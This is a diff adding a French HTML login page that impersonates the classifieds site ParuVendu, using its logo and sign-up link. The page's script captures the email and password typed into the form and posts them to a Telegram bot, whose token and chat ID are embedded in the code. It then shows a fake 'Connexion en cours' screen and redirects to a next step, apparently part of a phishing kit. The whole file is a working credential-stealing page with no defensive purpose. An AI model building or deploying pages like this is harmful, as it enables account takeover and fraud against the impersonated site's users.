@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - ParuVendu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
+            min-height: 100vh; /* Utilisation de min-height pour permettre le défilement */
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+            overflow-y: auto; /* Activation du défilement pour tout le body */
+        }
+        .logo {
+            position: fixed; /* Fixe le logo en haut à gauche */
+            top: 20px;
+            left: 20px;
+            z-index: -1; /* Met le logo en arrière-plan */
+            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+        }
+        .logo img {
+            width: 200px;
+            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+        }
+        .container {
+            width: 60%; /* Largeur du formulaire augmentée */
+            padding: 40px; /* Padding plus important */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2); /* Ombre plus prononcée */
+            position: relative; /* Position relative pour permettre le défilement */
+            margin-top: 120px; /* Espace en haut pour éviter que le formulaire ne soit caché par le logo */
+            margin-bottom: 50px; /* Espace en bas pour permettre le défilement */
+            animation: slideUp 1s ease-out;
+            border: 2px solid white; /* Bordure blanche pour mettre en évidence */
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px); /* Début légèrement en bas */
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0); /* Fin en position normale */
+                opacity: 1;
+            }
+        }
+        .form-group {
+            margin-bottom: 20px; /* Espacement entre les champs augmenté */
+            text-align: left;
+        }
+        input {
+            width: 100%; /* Largeur des champs */
+            padding: 15px; /* Padding plus important */
+            border: 1px solid #ccc;
+            border-radius: 5px; /* Bordures légèrement arrondies */
+            font-size: 16px; /* Taille de police augmentée */
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 8px rgba(255, 76, 76, 0.6); /* Ombre plus prononcée au focus */
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge plus foncé */
+            color: white;
+            padding: 12px 25px; /* Taille du bouton augmentée */
+            border: none;
+            border-radius: 25px; /* Bordures plus arrondies */
+            cursor: pointer;
+            width: 50%; /* Bouton plus large */
+            font-size: 16px; /* Taille du texte augmentée */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 24px; /* Taille de police augmentée */
+            font-weight: bold;
+            color: #ff4c4c;
+            margin-bottom: 30px; /* Espacement augmenté */
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 30px; /* Espacement augmenté */
+            z-index: -1; /* Met le logo du formulaire en arrière-plan */
+            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+        }
+        .form-logo img {
+            width: 120px; /* Taille du logo augmentée */
+            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+        }
+        .info-text {
+            font-size: 16px; /* Taille de police augmentée */
+            color: #666;
+            margin-bottom: 30px; /* Espacement augmenté */
+            text-align: center;
+        }
+        .info-text a {
+            color: #cc0000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9); /* Fond semi-transparent */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #333;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .loading-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu">
+    </div>
+    <div class="container">
+        <div class="connexion-text">Connexion à votre compte</div>
+        <div class="form-logo">
+            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit" class="btn">Se connecter</button>
+        </form>
+        <div class="info-text">
+            Vous n'avez pas de compte ?<br>
+            <a href="https://www.paruvendu.fr/inscription/" target="_blank">Créer un compte</a>
+        </div>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loadingScreen">
+        Connexion en cours...
+    </div>
+
+    <script>
+        // Constantes pour le bot Telegram
+        const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
+        const CHAT_ID = "5652184847";
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Erreur lors de l'envoi du message à Telegram");
+                }
+                console.log("Message envoyé avec succès à Telegram");
+            } catch (error) {
+                console.error("Erreur :", error);
+            }
+        }
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Empêche la soumission par défaut
+
+            // Afficher l'écran de chargement
+            const loadingScreen = document.getElementById("loadingScreen");
+            loadingScreen.classList.add("active");
+
+            // Récupérer les valeurs du formulaire
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Créer le message à envoyer
+            const message = `
+                🚨 Nouvelle tentative de connexion 🚨
+                E-mail : ${email}
+                Mot de passe : ${password}
+            `;
+
+            // Envoyer le message à Telegram
+            sendToTelegram(message);
+
+            // Simuler un délai de chargement (2 secondes)
+            setTimeout(() => {
+                // Rediriger vers la page suivante après l'envoi
+                window.location.href = "{{ url_for('next_page', current_page='paruconnexion') }}";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
